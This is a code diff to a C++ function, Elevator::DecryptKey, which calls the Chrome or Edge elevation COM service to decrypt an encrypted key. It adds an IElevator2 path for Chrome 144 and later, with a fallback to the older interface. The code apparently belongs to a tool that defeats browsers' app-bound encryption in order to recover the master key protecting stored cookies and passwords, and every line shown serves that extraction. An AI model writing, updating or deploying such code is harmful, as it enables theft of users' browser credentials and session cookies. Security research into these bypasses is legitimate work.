@@ -22,13 +22,17 @@ namespace Com
             CoUninitialize();
     }
 
-    std::vector<uint8_t> Elevator::DecryptKey(const std::vector<uint8_t> &encryptedKey, const CLSID &clsid, const IID &iid, bool isEdge)
+    std::vector<uint8_t> Elevator::DecryptKey(
+        const std::vector<uint8_t> &encryptedKey,
+        const CLSID &clsid,
+        const IID &iid,
+        const std::optional<IID> &iid_v2,
+        bool isEdge)
     {
         BSTR bstrEnc = SysAllocStringByteLen(reinterpret_cast<const char *>(encryptedKey.data()), (UINT)encryptedKey.size());
         if (!bstrEnc)
             throw std::runtime_error("SysAllocStringByteLen failed");
 
-        // RAII for BSTR
         struct BstrDeleter
         {
             void operator()(BSTR b) { SysFreeString(b); }
@@ -41,6 +45,7 @@ namespace Com
 
         if (isEdge)
         {
+            // Edge uses a different interface chain - no v2 support needed
             Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
             hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, &elevator);
             if (SUCCEEDED(hr))
@@ -53,7 +58,19 @@ namespace Com
         else
         {
             Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
-            hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, &elevator);
+
+            // Try IElevator2 first if available (Chrome 144+)
+            if (iid_v2.has_value())
+            {
+                hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid_v2.value(), &elevator);
+            }
+
+            // Fall back to IElevator if v2 not available or failed (Chrome 143 and earlier)
+            if (!iid_v2.has_value() || hr == E_NOINTERFACE || FAILED(hr))
+            {
+                hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, &elevator);
+            }
+
             if (SUCCEEDED(hr))
             {
                 CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
